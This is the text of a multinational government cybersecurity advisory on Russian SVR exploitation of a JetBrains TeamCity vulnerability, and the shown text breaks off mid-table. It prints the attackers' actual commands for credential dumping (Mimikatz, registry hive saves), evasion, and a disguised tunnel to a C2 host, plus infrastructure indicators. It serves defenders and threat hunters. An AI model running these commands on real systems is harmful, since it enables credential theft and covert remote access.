{
    "id": "9501def3-3e75-488b-935d-7078965b40f4",
    "created_at": "2023-12-21T02:04:17.910859Z",
    "updated_at": "2025-03-27T02:17:11.701696Z",
    "deleted_at": null,
    "sha1_hash": "443181071d70821ccd4f78533f8b6b9947dc4b46",
    "title": "Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally",
    "authors": "CISA",
    "file_creation_date": "2023-12-13T14:17:36Z",
    "file_modification_date": "2023-12-13T14:17:45Z",
    "file_size": 793237,
    "plain_text": "_Co-Authored by:_ Product ID: AA23-347A\n\n\n# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally\n\n## SUMMARY\nThe U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency\n(CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW),\nCERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian\nForeign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT\n[29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a](https://nvd.nist.gov/vuln/detail/cve-2023-42793)\nlarge scale, targeting servers hosting JetBrains TeamCity software since September 2023.\n\nSoftware developers use TeamCity software to manage and automate software compilation, building,\ntesting, and releasing. If compromised, access to a TeamCity server would provide malicious actors\nwith access to that software developer’s source code, signing certificates, and the ability to subvert\nsoftware compilation and deployment processes—access a malicious actor could further use to\nconduct supply chain operations. Although the SVR used such access to compromise SolarWinds\nand its customers in 2020, limited number and seemingly opportunistic types of victims currently\nidentified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar\nmanner. The SVR has, however, been observed using the initial access gleaned by exploiting the\nTeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other\nsteps to ensure persistent and long-term access to the compromised network environments.\n\nTo bring Russia’s actions to public attention, the authoring agencies are providing information on the\nSVR’s most recent compromise to aid organizations in conducting their own investigations and\nsecuring their networks, provide compromised entities with actionable indicators of compromise\n(IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s\nmalicious actions. The authoring agencies recommend all organizations with affected systems that\ndid not immediately apply available patches or workarounds to assume compromise and initiate threat\nhunting activities using the IOCs provided in this CSA. If potential compromise is detected,\nadministrators should apply the incident response recommendations included in this CSA and report\nkey findings to the FBI and CISA.\n\n_U.S. organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory,_\n_contact_ _[your local FBI field office](https://www.fbi.gov/contact-us/field-offices/)_ _[or CISA’s 24/7 Operations Center at Report@cisa.gov](mailto:Report@cisa.gov)_ _or (888) 282-0870. When available,_\n_please include the following information regarding the incident: date, time, and location of the incident; type of activity;_\n_number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and_\n_a designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or_\n_[SOC@cisecurity.org).](mailto:SOC@cisecurity.org)_\n\n_This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries_\n_minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to_\n_standard copyright rules TLP:CLEAR information may be distributed without restrictions For more information on the Traffic_\n\n\n-----\n\nInternational Partnership\n\n\nFor a downloadable copy of IOCs, see:\n\n  - [AA23-347A (STIX XML, 77KB)](https://www.cisa.gov/sites/default/files/2023-12/AA23-347A.stix__1.xml)\n\n  - [AA23-347A (STIX JSON, 70KB)](https://www.cisa.gov/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.json)\n\n## THREAT OVERVIEW\n\nSVR cyber operations pose a persistent threat to public and private organizations’ networks globally.\nSince 2013, cybersecurity companies and governments have reported on SVR operations targeting\nvictim networks to steal confidential and proprietary information. A decade later, the authoring\nagencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of,\nforeign intelligence, a broad concept that for Russia encompasses information on the politics,\neconomics, and military of foreign states; science and technology; and foreign counterintelligence.\nThe SVR also conducts cyber operations targeting technology companies that enable future cyber\noperations.\n\nA decade ago, public reports about SVR cyber activity focused largely on the SVR’s spearphishing\noperations, targeting government agencies, think tanks and policy analysis organizations, educational\ninstitutions, and political organizations. This category of targeting is consistent with the SVR’s\nresponsibility to collect political intelligence, the collection of which has long been the SVR’s highest\npriority. For the Russian Government, political intelligence includes not only the development and\nexecution of foreign policies, but also the development and execution of domestic policies and the\npolitical processes that drive them. In December 2016, the U.S. Government published a Joint\nAnalysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the\nSVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of\nspear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily\ntargeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report\ndescribing tools and techniques used by the SVR to target embassies in dozens of countries.\n\nLess frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign\nintelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published\nan advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its\ndeployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations\ninvolved in COVID-19 vaccine development. Although not listed in the 2020 advisory, the authoring\nagencies can now disclose that the SVR’s WellMess campaign also targeted energy companies.\nSuch biomedical and energy targets are consistent with the SVR’s responsibility to support the\nRussian economy by pursuing two categories of foreign intelligence known as economic intelligence\nand science and technology.\n\nIn April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds\ninformation technology company and its customers to the SVR. This attribution marked the discovery\nthat the SVR had, since at least 2018, expanded the range of its cyber operations to include the\nwidespread targeting of information technology companies. At least some of this targeting was aimed\nat enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments\npublished advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the\n\n\n-----\n\nInternational Partnership\n\n\nSVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’\nnetworks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.\n\nIn this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably\ncontinues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a\nsoftware development program, the authoring agencies assess the SVR could benefit from access to\nvictims, particularly by allowing the threat actors to compromise the networks of dozens of software\ndevelopers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s\noperation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring\nagencies assess the SVR has not yet used its accesses to software developers to access customer\nnetworks and is likely still in the preparatory phase of its operation, having access to these\ncompanies’ networks presents the SVR with opportunities to enable hard-to- detect command and\ncontrol (C2) infrastructure.\n\n## TECHNICAL DETAILS\n\n**[Note: This advisory uses the MITRE ATT&CK[®] for Enterprise framework, version 14. See the MITRE](https://attack.mitre.org/versions/v14/matrices/enterprise/)**\nATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE\nATT&CK[®] tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE\n[ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping)\n[and CISA’s Decider Tool. While SVR followed a similar playbook in each compromise, they also](https://github.com/cisagov/Decider/)\nadjusted to each operating environment and not all presented steps or actions below were executed\non every host.\n\n#### Initial Access - Exploitation\n\n[The SVR started to exploit Internet-connected JetBrains TeamCity servers [T1190] in late September](https://attack.mitre.org/versions/v14/techniques/T1190/)\n2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for\nbypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies’\n[observations show that the TeamCity exploitation usually resulted in code execution [T1203] with high](https://attack.mitre.org/versions/v14/techniques/T1203/)\nprivileges granting the SVR an advantageous foothold in the network environment. The authoring\nagencies are not currently aware of any other initial access vector to JetBrains TeamCity currently\nbeing exploited by the SVR.\n\n#### Host Reconnaissance\n\nInitial observations show the SVR used the following basic, built-in commands to perform host\n[reconnaissance [T1033],[T1059.003],[T1592.002]:](https://attack.mitre.org/versions/v14/techniques/T1033/)\n\n  - whoami /priv\n\n  - whoami /all\n\n  - whoami /groups\n\n  - whoami /domain\n\n  - nltest -dclist\n\n  - nltest -dsgetdc\n\n  - tasklist\n\n  - netstat\n\n\n-----\n\nInternational Partnership\n\n\n\n  - wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\"\" /password:\"\"<redacted>\"\" process list brief\n\n  - wmic /node:\"\"<redacted>\"\" process list brief\n\n  - wmic process get commandline -all\n\n  - wmic process <proc_id> get commandline\n\n  - wmic process where name=\"\"GoogleCrashHandler64.exe\"\" get commandline,processed\n\n  - powershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties\n\n  - powershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties.memberof\n\n  - powershell Get-WmiObject -Class Win32_Service -Computername\n\n  - powershell Get-WindowsDriver -Online -All\n\n#### File Exfiltration\n\n[Additionally, the authoring agencies have observed the SVR exfiltrating files [T1041] which may](https://attack.mitre.org/versions/v14/techniques/T1041/)\nprovide insight into the host system’s operating system:\n\n  - C:\\Windows\\system32\\ntoskrnl.exe to precisely identify system version, likely as a prerequisite\nto deploy EDRSandBlast.\n\n  - SQL Server executable files - based on the review of the post exploitation actions, the SVR\nshowed an interest in specific files of the SQL Server installed on the compromised systems:\n\n    - C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll,\n\n    - C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll,\n\n    - C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll,\n\n    - C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\n\n    - C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\secforwarder.dll\n\n  - Visual Studio files – based on the review of the post exploitation actions, the SVR showed an\ninterest in specific files of the Visual Studio:\n\n    - C:\\Program Files (x86)\\Microsoft Visual\nStudio\\2017\\SQL\\Common7\\IDE\\VSIXAutoUpdate.exe\n\n   - Update management agent files – based on the review of the post exploitation actions, the\nSVR showed an interest in executables and configuration of patch management software:\n```\n       o C:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\\bin\\httpd.exe\n       o C:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\n       o C:\\ProgramData\\GFI\\LanGuard 12\\HttpdConfig\\httpd.conf\n\n#### Interest in SQL Server\n\n```\nBased on the review of the exploitation, the SVR also showed an interest in details of the SQL Server\n\n[[T1059.001],[T1505.001]:](https://attack.mitre.org/versions/v14/techniques/T1059/001/)\n\n  - powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\",\"C:\\Program Files\\Microsoft SQL\n\n\n-----\n\nInternational Partnership\n\n\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll\",\"C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll\",\"C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\" -DestinationPath\nC:\\Windows\\temp\\1\\sql.zip\n\n  - SVR cyber actors also exfiltrated secforwarder.dll\n\n#### Tactics Used to Avoid Detection\n\n[To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable](https://attack.mitre.org/versions/v14/techniques/T1068/)\n[or outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001].](https://attack.mitre.org/versions/v14/techniques/T1562/001/)\n\nThis was done using an open source project called “EDRSandBlast.” The authoring agencies have\nobserved the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is\nused for controlling and protecting running processes and protecting them from infection. The actors\n[then inject code into AV/EDR processes for a small subset of victims [T1068]. Additionally,](https://attack.mitre.org/versions/v14/techniques/T1068/)\n[executables that are likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001].](https://attack.mitre.org/versions/v14/techniques/T1003/001/)\n\nIn several cases SVR attempted to hide their backdoors via:\n\n  - Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL\nwith their one containing GraphicalProton backdoor,\n\n  - Backdooring an open source application developed by Microsoft named vcperf. SVR modified\nand copied publicly available source code. After execution, backdoored vcperf dropped\nseveral DLLs to disc, one of those being a GraphicalProton backdoor,\n\n  - Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate\nDLL with one containing GraphicalProton backdoor.\n\nTo avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft\nOneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware\n[via OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564], illustrated](https://attack.mitre.org/versions/v14/techniques/T1564/)\nbelow:\n\n#### Privilege Escalation\n\n[To facilitate privilege escalation [T1098], the SVR used multiple techniques, including WinPEAS,](vhttps://attack.mitre.org/versions/v14/techniques/T1098/)\nNoLMHash registry key modification, and the Mimikatz tool.\n\nThe SVR modified the NoLMHash registry using the following reg command:\n\n  - reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v NoLMHash /t\nREG_DWORD /d \"0\" /f\n\n\n-----\n\nInternational Partnership\n\n\n[The SVR used the following Mimikatz commands [T1003]:](https://attack.mitre.org/versions/v14/techniques/T1003/)\n\n  - privilege::debug\n\n  - lsadump::cache\n\n  - lsadump::secrets\n\n  - lsadump::sam\n\n  - sekurlsa::logonpasswords\n\n#### Persistence\n\n[The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors.](https://attack.mitre.org/versions/v14/techniques/T1053/005/)\nDepending on the privileges the SVR had, their executables were stored in one of following\ndirectories:\n\n  - C:\\Windows\\temp\n\n  - C:\\Windows\\System32\n\n  - C:\\Windows\\WinStore\n\nThe SVR made all modifications using the schtasks.exe binary. It then had multiple variants of\narguments passed to schtasks.exe, which can be found in Appendix B – Indicators of\n**Compromise.**\n\nTo secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket\n[Granting Tickets (TGTs) [T1558.001].](https://attack.mitre.org/versions/v14/techniques/T1558/001/)\n\n#### Sensitive Data Exfiltration [T1020]\n\n[The SVR exfiltrated the following Windows Registry hives from its victims [T1003]:](https://attack.mitre.org/versions/v14/techniques/T1003/001/)\n\n  - HKLM\\SYSTEM\n\n  - HKLM\\SAM\n\n  - HKLM\\SECURITY\n\n[In order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and](https://attack.mitre.org/versions/v14/techniques/T1003/002/)\nthen exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and\nSECURITY registry hives, and used powershell to stage .zip archives in the C:\\Windows\\Temp\\\ndirectory.\n\n  - reg save HKLM\\SYSTEM \"\"C:\\Windows\\temp\\1\\sy.sa\"\" /y\n\n  - reg save HKLM\\SAM \"\"C:\\Windows\\temp\\1\\sam.sa\"\" /y\n\n  - reg save HKLM\\SECURITY \"\"C:\\Windows\\temp\\1\\se.sa\"\" /y\n\n  - powershell Compress-Archive -Path C:\\Windows\\temp\\1\\ -DestinationPath\nC:\\Windows\\temp\\s.zip -Force & del C:\\Windows\\temp\\1 /F /Q\n\nIn a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such\nas session cookies, browsing history, or saved logins.\n\nSVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to\nobtain a sensitive Domain information.\n\n#### Network Reconnaissance\n\n\n-----\n\nInternational Partnership\n\n\nAfter the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then\n[focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using](https://attack.mitre.org/versions/v14/techniques/T1590/004/)\na mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it\n[launched into memory [T1046]. The SVR executed the following PowerSploit commands:](https://attack.mitre.org/versions/v14/techniques/T1046/)\n\n  - Get-NetComputer\n\n  - Get-NetGroup\n\n  - Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description,\npwdlastset, logoncount, badpwdcount\"\n\n  - Get-NetDiDomain\n\n  - Get-AdUser\n\n  - Get-DomainUser -UserName\n\n  - Get-NetUser -PreauthNotRequire\n\n  - Get-NetComputer | select samaccountname\n\n  - Get-NetUser -SPN | select serviceprincipalname\n\n#### Tunneling into Compromised Environments\n\nIn selected environments the SVR used an additional tool named, “rr.exe”—a modified open source\n[reverse socks tunneler named Rsockstun—to establish a tunnel to the C2 infrastructure [T1572].](https://attack.mitre.org/versions/v14/techniques/T1572/)\n\nThe authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:\n\n  - 65.20.97[.]203:443\n\n  - Poetpages[.]com:8443\n\nThe SVR executed Rsockstun either in memory or using the Windows Management Instrumentation\n[Command Line (WMIC) [T1047] utility after dropping it to disk:](https://attack.mitre.org/versions/v14/techniques/T1047/)\n\n  - wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat\nProtection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"\n\n#### Lateral Movement\n\n[The SVR used WMIC to facilitate lateral movement [T1047],[T1210].](https://attack.mitre.org/versions/v14/techniques/T1047/)\n\n  - wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\" /password:\"\"<redacted>\"\" process call create\n\"\"rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHost\"\"\n\n[The SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210].](https://attack.mitre.org/versions/v14/techniques/T1210/)\n\nIt modified Registry using the following reg command:\n\n  - reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v\nDisableRestrictedAdmin /t REG_DWORD /d \"0\" /f\n\n#### Adversary Toolset\n\nIn the course of the TeamCity operation, the SVR used multiple custom and open source available\ntools and backdoors. The following custom tools were observed in use during the operation:\n\n\n-----\n\nInternational Partnership\n\n\n\n  - **GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly**\n[generated BMPs [T1027.001] to exchange data with the SVR operator.](https://attack.mitre.org/versions/v14/techniques/T1027/001/)\n\n  - After execution, GraphicalProton gathers environment information such as active TCP/UDP\n[connections [T1049], running processes [T1049], as well as user, host, and domain names](https://attack.mitre.org/versions/v14/techniques/T1049/)\n\n[[T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a](https://attack.mitre.org/versions/v14/techniques/T1590/)\n[backup channel [T1567]. API keys are hardcoded into the malware. When communicating with](https://attack.mitre.org/versions/v14/techniques/T1567/)\ncloud services, GraphicalProton generates a randomly named directory which is used to store\n[infection-specific BMP files - with both commands and results [T1564.001]. Directory name is](https://attack.mitre.org/versions/v14/techniques/T1564/001/)\nre-randomized each time the GraphicalProton process is started.\n\n  - BMP files that were used to exchange data were generated in the following way:\n\n**1.** Compress data using zlib,\n**2.** Encrypt data using custom algorithm,\n**3.** Add “***” string literal to encrypted data,\n**4.** Create a random BMP with random rectangle,\n**5.** And finally, encode encrypted data within lower pixel bits.\n\nWhile the GraphicalProton backdoor has remained mostly unchanged over the months we have been\ntracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation,\nencryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are\n[especially noteworthy – a variant that uses DLL hijacking [T1574.002] in Zabbix as a means to start](https://attack.mitre.org/versions/v14/techniques/T1574/002/)\nexecution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself\n[within vcperf [T1036], an open-source C++ build analysis tool from Microsoft.](https://attack.mitre.org/versions/v14/techniques/T1036/)\n\n  - **GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced**\nby the SVR that forgoes using cloud-based services as a C2 channel and instead relies on\nHTTP request.\nTo legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy\nWordPress website. Execution of HTTPS variant of GraphicalProton is split into two files –\nstager and encrypted binary file that contains further code.\n\n## MITRE ATT&CK TACTICS AND TECHNIQUES\n\nSee below tables for all referenced threat actor tactics and techniques in this advisory. For additional\nmitigations, see the Mitigations section.\n\n_Table 1: SVR Cyber Actors ATT&CK Techniques for Enterprise - Reconnaissance_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Gather Victim Network Information: Network Topology|T1590.004|SVR cyber actors may gather information about the victim’s network topology that can be used during targeting.|\n\n\n-----\n\n|Gather Victim Host Information: Software|T1592.002|SVR cyber actors may gather information about the victim’s host networks that can be used during targeting.|\n|---|---|---|\n\n\nInternational Partnership\n\n\n_Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access_\n\n**Technique Title** **ID** **Use**\n\nExploit Public-Facing Application [T1190](https://attack.mitre.org/versions/v14/techniques/T1190/) SVR cyber actors exploit internetconnected JetBrains TeamCity server\nusing CVE-2023-42793 for initial\naccess.\n\n_Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Exploit Public-Facing Application|T1190|SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Command and Scripting Interpreter: PowerShell|T1059.001|SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files.|\n|Command and Scripting Interpreter: Windows Command Shell|T1059.003|SVR cyber actors execute these powershell commands to perform host reconnaissance: • powershell ([adsisearcher]\"((samaccountn ame=<redacted>))\").Findall().P roperties • powershell ([adsisearcher]\"((samaccountn ame=<redacted>))\").Findall().P roperties.memberof • powershell Get-WmiObject - Class Win32_Service - Computername • powershell Get-WindowsDriver -Online -All|\n|Exploitation for Client Execution|T1203|SVR cyber actors leverage arbitrary code execution after exploiting CVE- 2023-42793.|\n\n\n-----\n\n|Hijack Execution Flow: DLL Side-Loading|T1574.002|SVR cyber actors use a variant of GraphicalProton that uses DLL hijacking in Zabbix as a means to start execution.|\n|---|---|---|\n\n\nInternational Partnership\n\n\n_Table 4: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Persistence_\n\n**Technique Title** **ID** **Use**\n\nScheduled Task [T1053.005](https://attack.mitre.org/versions/v14/techniques/T1053/005/) SVR cyber actors may abuse\nWindows Task Schedule to perform\ntask scheduling for initial or recurring\nexecution of malicious code.\n\nServer Software Component: [T1505.001](https://attack.mitre.org/versions/v14/techniques/T1505/001/) SVR cyber actors abuse SQL server\nSQL Stored Procedures stored procedures to maintain\n\npersistence.\n\nBoot or Logon Autostart [T1547](https://attack.mitre.org/versions/v14/techniques/T1547/)\n\nSVR cyber actors used\nC:\\Windows\\system32\\ntoskrnl.exe\nto configure automatic system boot\nsettings to maintain persistence.\n\n_Table 5: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Privilege Escalation_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Scheduled Task|T1053.005|SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code.|\n|Server Software Component: SQL Stored Procedures|T1505.001|SVR cyber actors abuse SQL server stored procedures to maintain persistence.|\n|Boot or Logon Autostart Execution|T1547|SVR cyber actors used C:\\Windows\\system32\\ntoskrnl.exe to configure automatic system boot settings to maintain persistence.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Exploitation for Privilege Escalation|T1068|SVR cyber actors exploit JetBrains TeamCity vulnerability to achieve escalated privileges. To avoid detection, the SVR cyber actors used a “Bring Your Own Vulnerable Driver” technique to disable EDR and AV defense mechanisms.|\n|Account Manipulation|T1098|SVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems.|\n\n\n-----\n\nInternational Partnership\n\n\n_Table 6: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Defense Evasion_\n\n**Technique Title** **ID** **Use**\n\nObfuscated Files or Information: [T1027.001](https://attack.mitre.org/versions/v14/techniques/T1027/001/) SVR cyber actors use BMPs to\n\nperform binary padding while\nexchange data is exfiltrated to an\ntheir C2 station.\n\n[T1036](https://attack.mitre.org/versions/v14/techniques/T1036/) SVR cyber actors use a variant that\nuses DLL hijacking in Zabbix as a\nmeans to start execution (and\npotentially provide long-term, hard-todetect access) and a variant that\nmasks itself within vcperf, an opensource C++ build analysis tool from\nMicrosoft.\n\nProcess Injection [T1055](https://attack.mitre.org/versions/v14/techniques/T1055/) SVR cyber actors inject code into AV\nand EDR processes to evade\ndefenses.\n\nDisable or Modify Tools [T1562.001](https://attack.mitre.org/versions/v14/techniques/T1562/001/) SVR cyber actors may modify and/or\ndisable tools to avoid possible\ndetection of their malware/tools and\nactivities.\n\n[T1564](https://attack.mitre.org/versions/v14/techniques/T1564/) SVR cyber actors may attempt to\nhide artifacts associated with their\nbehaviors to evade detection.\n\nHide Artifacts: Hidden Files and [T1564.001](https://attack.mitre.org/versions/v14/techniques/T1564/001/) When communicating with cloud\n\nservices, GraphicalProton generates\na randomly named directory which is\nused to store infection-specific BMP\nfiles - with both commands and\nresults.\n\n_Table 7: SVR Cyber actors’ ATT&CK Techniques for Enterprise: Credential Access_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Obfuscated Files or Information: Binary Padding|T1027.001|SVR cyber actors use BMPs to perform binary padding while exchange data is exfiltrated to an their C2 station.|\n|Masquerading|T1036|SVR cyber actors use a variant that uses DLL hijacking in Zabbix as a means to start execution (and potentially provide long-term, hard-to- detect access) and a variant that masks itself within vcperf, an open- source C++ build analysis tool from Microsoft.|\n|Process Injection|T1055|SVR cyber actors inject code into AV and EDR processes to evade defenses.|\n|Disable or Modify Tools|T1562.001|SVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.|\n|Hide Artifacts|T1564|SVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.|\n|Hide Artifacts: Hidden Files and Directories|T1564.001|When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|OS Credential Dumping: LSASS Memory|T1003.001|SVR cyber actors executed Mimikatz commands in memory to gain access to credentials stored in memory.|\n\n\n-----\n\n|OS Credential Dumping: Security Account Manager|T1003.002|SVR cyber actors used: • privilege::debug • lsadump::cache • lsadump::secrets • lsadump::sam • sekurlsa::logonpasswords Mimikatz commands to gain access to credentials. Additionally, SVR cyber actors exfiltrated Windows registry hives to steal credentials. • HKLM\\SYSTEM • HKLM\\SAM • HKLM\\SECURITY|\n|---|---|---|\n|Credentials from Password Stores: Credentials from Web Browsers|T1555.003|In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.|\n|Steal or Forge Kerberos Tickets: Golden Ticket|T1558.001|To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).|\n\n\nInternational Partnership\n\n\n_Table 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|System Owner/User Discovery|T1033|SVR cyber actors use these built-in commands to perform host reconnaissance: whoami /priv, whoami / all, whoami / groups, whoami / domain to perform user discovery.|\n|Network Service Discovery|T1046|SVR cyber actors performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit.|\n\n\n-----\n\n|Process Discovery|T1057|SVR cyber actors use GraphicalProton to gather running processes data.|\n|---|---|---|\n|Gather Victim Network Information|T1590|SVR cyber actors use GraphicalProton to gather victim network information.|\n\n\nInternational Partnership\n\n\n_Table 9: SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement_\n\n**Technique Title** **ID** **Use**\n\nExploitation of Remote Services [T1210](https://attack.mitre.org/versions/v14/techniques/T1210/) SVR cyber actors may exploit remote\nservices to gain unauthorized access\nto internal systems once inside a\nnetwork.\n\nWindows Management [T1047](https://attack.mitre.org/versions/v14/techniques/T1047/) SVR cyber actors executed\nInstrumentation Rsockstun either in memory or\n\nusing Windows Management\nInstrumentation (WMI) to execute\nmalicious commands and\npayloads.\n\nwmic process call create\n\"C:\\Program Files\\Windows\nDefender Advanced Threat\nProtection\\Sense.exe -connect\npoetpages.com -pass M5540sddsf2@34232fsl45t31\"\n\n_Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and Control_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Exploitation of Remote Services|T1210|SVR cyber actors may exploit remote services to gain unauthorized access to internal systems once inside a network.|\n|Windows Management Instrumentation|T1047|SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads. wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554- 0sddsf2@34232fsl45t31\"|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Dynamic Resolution|T1568|SVR may dynamically establish connections to command-and-control infrastructure to evade common detections and remediations.|\n|Protocol Tunneling|T1572|SVR cyber actors may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.|\n\n\n-----\n\n|Col1|Col2|In selected environments, the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstunm—to establish a tunnel to the C2 infrastructure.|\n|---|---|---|\n\n\nInternational Partnership\n\n\n_Table 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration_\n\n**Technique Title** **ID** **Use**\n\nAutomated Exfiltration [T1020](https://attack.mitre.org/versions/v14/techniques/T1020/) 